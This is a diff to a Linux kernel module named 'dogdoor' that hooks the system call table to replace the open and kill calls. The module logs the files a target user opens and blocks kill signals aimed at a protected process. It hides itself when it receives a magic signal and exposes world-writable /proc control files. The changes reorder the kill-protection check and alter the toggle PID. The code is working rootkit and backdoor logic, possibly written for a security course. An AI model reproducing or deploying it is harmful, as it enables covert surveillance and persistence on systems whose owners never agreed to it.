@@ -13,17 +13,19 @@
 #include <asm/unistd.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
-#define FILENAME_COUNT 10
-#define FILENAME_SIZE 256
 
 #define TOGGLE_SIG 99
-#define TOOGLE_PID 12345
+#define TOOGLE_PID -1
 
 MODULE_LICENSE("GPL");
+
+#define FILENAME_COUNT 10
+#define FILENAME_SIZE 256
 
 char * accessed_filenames[FILENAME_COUNT];
 char user_uid[128] = "-1";
 int count_accessed_filenames = 0;
+
 char prevented_pid[16] = "-1";
 void ** sctable ;
 int is_hidden = 0; 
@@ -73,12 +75,6 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 asmlinkage int (*orig_sys_kill)(int pid, int sig); 
 asmlinkage int dogdoor_sys_kill(int pid, int sig)
 {
-	int i_current_pid = (int)simple_strtol(prevented_pid, NULL, 10);
-
-    if (pid == i_current_pid && i_current_pid != -1) {
-        printk("YOU CANNOT KILL THIS PROCESS (%d)\n", pid);
-        return 1;
-    }
 
 	if (TOGGLE_SIG == sig && TOOGLE_PID == pid){
 		if(!is_hidden){
@@ -94,6 +90,12 @@ asmlinkage int dogdoor_sys_kill(int pid, int sig)
 		return 1; 
 	}
 
+	int i_current_pid = (int)simple_strtol(prevented_pid, NULL, 10);
+
+    if (pid == i_current_pid && i_current_pid != -1) {
+        printk("YOU CANNOT KILL THIS PROCESS (%d)\n", pid);
+        return 1;
+    }
 	return orig_sys_kill(pid, sig);
 }
 
@@ -242,6 +244,7 @@ int __init dogdoor_init(void) {
 
 	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
 	proc_create("dogdoor_log", S_IRUGO | S_IWUGO, NULL, &dogdoor_log_fops) ;
+
 	proc_create("dogdoor_pid", S_IRUGO | S_IWUGO, NULL, &dogdoor_pid_fops) ;
 
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
